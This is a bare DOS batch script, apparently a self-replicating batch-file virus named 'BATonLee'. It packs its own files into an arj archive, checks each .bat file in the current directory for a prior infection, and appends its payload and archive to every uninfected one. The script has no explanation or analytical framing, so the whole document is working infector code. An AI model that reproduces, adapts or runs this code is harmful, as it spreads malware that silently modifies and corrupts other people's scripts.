@echo off
goto _%1
:_
arj a BATonLee.arj BATonLee.*>nul
for %%a in (*.bat) do call %0 i %%a
goto _e
:_i
arj l %2>nul
if errorlevel 1 goto _notinfected
goto _e
:_notinfected
copy /a %2+BATonLee.dat BATonLee.tmp>nul
copy /b BATonLee.tmp+BATonLee.arj %2>nul
:_e
